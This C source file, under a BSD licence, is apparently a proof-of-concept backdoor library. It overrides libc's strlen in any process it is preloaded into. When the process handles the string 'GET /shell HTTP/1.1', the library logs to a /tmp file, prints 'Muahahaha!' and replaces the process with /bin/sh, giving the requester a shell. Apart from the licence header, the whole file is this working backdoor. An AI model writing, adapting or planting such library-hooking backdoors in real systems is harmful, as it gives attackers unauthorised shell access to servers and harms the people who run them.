/*
 * Copyright (c) 2011-2014, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *    1) Redistributions of source code must retain the above
 *       copyright notice, this list of conditions and the following
 *       disclaimer.
 *    2) Redistributions in binary form must reproduce the above
 *       copyright notice, this list of conditions and the following
 *       disclaimer in the documentation and/or other materials
 *       provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
 * CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
 * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF
 * USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED
 * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

#include <sys/types.h>
#include <dirent.h>

static void *dl;
size_t (*orig_strlen)(const char *);

__attribute__((constructor)) void stub(void)
{
	dl = dlopen("/lib/libc.so.6", RTLD_LAZY | RTLD_GLOBAL);
	orig_strlen = dlsym(dl, "strlen");
	
}

size_t strlen(const char *s)
{
	FILE *fp;
	char filename[1024+1];
	
	if (!strcmp(s, "GET /shell HTTP/1.1"))
	{
		snprintf(filename, sizeof(filename), "/tmp/mal-%d.log", getpid());
		fp = fopen(filename, "a");
		if ((fp))
		{
	
			fprintf(fp, "Attempting to start shell!\n");
			fclose(fp);
		}
		
		printf("Muahahaha!\n");
		
		execl("/bin/sh", "sh", NULL);
	}
	
	return orig_strlen(s);
}
